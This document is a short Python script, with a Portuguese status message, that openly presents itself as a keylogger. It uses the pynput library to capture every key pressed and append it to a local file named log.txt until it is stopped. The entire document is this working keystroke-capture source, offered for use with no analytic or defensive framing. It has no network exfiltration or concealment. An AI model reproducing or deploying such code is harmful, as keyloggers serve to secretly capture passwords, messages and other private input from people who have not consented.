from pynput import keyboard
import time

LOG_FILE = "log.txt"

def on_press(key):
    with open(LOG_FILE, "a") as log:
        try:
            log.write(f"{key.char}")
        except AttributeError:
            log.write(f"[{key}]")

def main():
    print("Keylogger rodando (Ctrl+C para parar)... (Tudo é salvo em log.txt)")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
